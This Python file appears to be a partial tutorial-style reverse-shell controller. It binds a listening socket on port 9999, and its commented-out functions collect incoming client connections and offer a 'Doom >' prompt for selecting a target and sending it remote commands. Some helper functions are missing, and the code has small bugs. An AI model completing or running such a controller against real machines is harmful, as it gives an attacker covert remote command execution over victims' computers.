import socket
import sys
import threading
from queue import Queue


# Creating the Socket( allows two computers to connect )
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as e:
        print("Socket Creation error: " + str(e))


# Binding socket to port and wait for connection from the client
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding socket to port : " + str(port))
        s.bind((host, port))
        s.listen(5) # allow server to accept incoming connections
    except socket.error as e:
        print("Socket Binding Error : " + str(e) + "\n" + "Retyring...")
        bind_socket()


# Accept a connection from multiple clients and save to list
# def accept_connections():
#     for c in all_connections:
#         c.close()
#     del all_connections[:]
#     del all_addresses[:]
#     while 1:
#         try:
#             conn, addr = s.accept()
#             conn.setblocking(1)
#             all_connections.append(conn)
#             all_addresses.append(addr)
#             print("\nConnection has been Established : " + addr[0])
#         except:
#             print("Error accepting connections .")

   
# Interactive prompt for sending commands remotely
# def start_doom():
#     while True:
#         cmd = input('Doom >')
#         if cmd == 'list':
#             list_connections()
#         elif 'select' in cmd:
#             conn = get_target(cmd)
#             if conn is not none:
#                 send_target_commands(conn)
#         else:
#             print("Command not recognized")


# Displays all current connections
# def list_connections():
#     results = ''
#     for i, conn in enumerate(all_connections):
#         try:
#             # sending a blank msg to ensure that we are connected.
#             conn.send(str.encode(' '))
#             conn.recv(20480)
#         except:
#             del all_connections[i]
#             del all_addresses[i]
#             continue
#         results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
#     print('----------------- Clients -----------------' + '\n' + results)